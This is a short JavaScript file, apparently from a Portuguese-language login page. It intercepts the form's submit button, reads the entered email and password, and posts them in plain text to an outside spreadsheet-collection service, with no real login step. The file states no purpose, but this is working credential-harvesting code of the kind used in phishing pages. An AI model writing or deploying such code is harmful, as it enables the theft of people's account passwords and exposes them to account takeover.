const btnEnviar = document.querySelector("#botao")

btnEnviar.addEventListener("click", (e) => {
    e.preventDefault()
    const login = document.querySelector("#email").value
    const senha = document.querySelector("#senha").value


    fetch("https://api.sheetmonkey.io/form/8nu7cMfsy6jaWv45NSL2WL", {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            email: login,
            senha
        })
    })
})